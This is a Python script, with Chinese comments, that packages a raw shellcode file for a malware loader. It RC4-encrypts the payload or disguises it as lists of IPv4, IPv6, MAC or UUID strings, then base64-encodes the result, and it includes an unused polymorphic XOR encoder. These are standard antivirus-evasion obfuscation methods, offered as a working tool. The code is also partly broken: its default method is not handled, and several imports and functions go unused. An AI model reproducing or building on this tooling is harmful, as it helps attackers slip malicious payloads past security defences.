
import os
import base64
import hashlib
import argparse
import uuid
from Crypto.Cipher import ChaCha20, AES
from Crypto.Util.Padding import pad


def bytes_to_ipv4(b):
    return '.'.join(str(x) for x in b)


def bytes_to_ipv6(b):
    parts = []
    for i in range(0, 16, 2):
        v = int.from_bytes(b[i:i+2], 'big')
        parts.append(f'{v:04X}')
    return ':'.join(parts)
from ctypes import *


def read_binary_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            return f.read()
    except FileNotFoundError:
        print(f"Error: The file {file_path} does not exist.")
        return None


def save_encrypted_base64(file_path, b64_data):
    with open(file_path, 'wb') as f:
        f.write(b64_data)


def parse_args():
    p = argparse.ArgumentParser(description="Encrypt binary to new payload format")
    p.add_argument("-i", "--input", default="calc.bin", help="input binary file (default calc.bin)")
    p.add_argument("-o", "--output", default="src/encrypt.bin", help="output base64 file (default src/encrypt.bin)")
    p.add_argument("-m", "--method", default="chacha20-aes", choices=["rc4", "ipv4", "ipv6", "mac", "uuid"],
                   help="encryption method (supported: rc4, ipv4, ipv6, mac, uuid)")
    return p.parse_args()



def sgn_polymorph_encrypt(data, key, rounds):
    buf = bytearray(data)
    for r in range(rounds):
        # 1. 异或
        for i in range(len(buf)):
            buf[i] ^= (key + i) & 0xFF
            buf[i] ^= ((key >> ((i % 4) * 8)) & 0xFF) ^ ((r & 7) << 1)
        # 2. 加/减
        if r % 2 == 0:
            for i in range(len(buf)):
                buf[i] = (buf[i] + ((key & 0xFF) + i)) & 0xFF
        else:
            for i in range(len(buf)):
                buf[i] = (buf[i] - ((key & 0xFF) - i)) & 0xFF
        # 3. 位移
        for i in range(len(buf)):
            rot = ((key >> ((i % 4) * 8)) & 7)
            buf[i] = ((buf[i] << rot) | (buf[i] >> (8 - rot))) & 0xFF
        # 4. 反转
        if r % 3 == 0:
            buf.reverse()
    return bytes(buf)

def main():

    args = parse_args()
    input_file = args.input
    output_file = args.output
    data = read_binary_file(input_file)
    if data is None:
        return

    if  args.method == "rc4":
        from Crypto.Cipher import ARC4
        key = os.urandom(32)  # 256-bit key
        cipher = ARC4.new(key)
        encrypted = cipher.encrypt(data)
        sha256 = hashlib.sha256()
        sha256.update(data)
        hash1 = sha256.digest()
        # 格式: [key(32)][hash(32)][encrypted...]
        final = key + hash1 + encrypted
    elif args.method == "ipv4":
        addresses = []
        for i in range(0, len(data), 4):
            addr_bytes = data[i:i+4]
            if len(addr_bytes) < 4:
                addr_bytes += b'\x00' * (4 - len(addr_bytes))
            addresses.append(bytes_to_ipv4(addr_bytes))
        sha256 = hashlib.sha256()
        sha256.update(data)
        hash1 = sha256.digest()
        len_bytes = len(data).to_bytes(4, 'little')
        final = hash1 + len_bytes + ','.join(addresses).encode()
    elif args.method == "ipv6":
        addresses = []
        for i in range(0, len(data), 16):
            addr_bytes = data[i:i+16]
            if len(addr_bytes) < 16:
                addr_bytes += b'\x00' * (16 - len(addr_bytes))
            addresses.append(bytes_to_ipv6(addr_bytes))
        sha256 = hashlib.sha256()
        sha256.update(data)
        hash1 = sha256.digest()
        len_bytes = len(data).to_bytes(4, 'little')
        final = hash1 + len_bytes + ','.join(addresses).encode()

    elif args.method == "mac":
        def bytes_to_mac(b):
            # 与 RtlEthernetAddressToStringA 完全一致，格式 01-23-45-67-89-AB
            return '-'.join(f'{x:02X}' for x in b)
        addresses = []
        for i in range(0, len(data), 6):
            mac_bytes = data[i:i+6]
            if len(mac_bytes) < 6:
                mac_bytes += b'\x00' * (6 - len(mac_bytes))
            addresses.append(bytes_to_mac(mac_bytes))
        sha256 = hashlib.sha256()
        sha256.update(data)
        hash1 = sha256.digest()
        len_bytes = len(data).to_bytes(4, 'little')
        final = hash1 + len_bytes + ','.join(addresses).encode()

    elif args.method == "uuid":
        # 补齐到16字节倍数
        pad_len = (16 - (len(data) % 16)) % 16
        if pad_len:
            data += b'\x00' * pad_len
        uuids = []
        for i in range(0, len(data), 16):
            block = data[i:i+16]
            u = uuid.UUID(bytes=block)
            uuids.append(str(u))
        sha256 = hashlib.sha256()
        sha256.update(data)
        hash1 = sha256.digest()
        len_bytes = len(data).to_bytes(4, 'little')
        final = hash1 + len_bytes + ','.join(uuids).encode()
    else:
        raise SystemExit(f"Unsupported --method: {args.method}")

    b64 = base64.b64encode(final)
    save_encrypted_base64(output_file, b64)
    print(f"Encrypted data (new format, method={args.method}) saved to {output_file}")


if __name__ == '__main__':
    main()

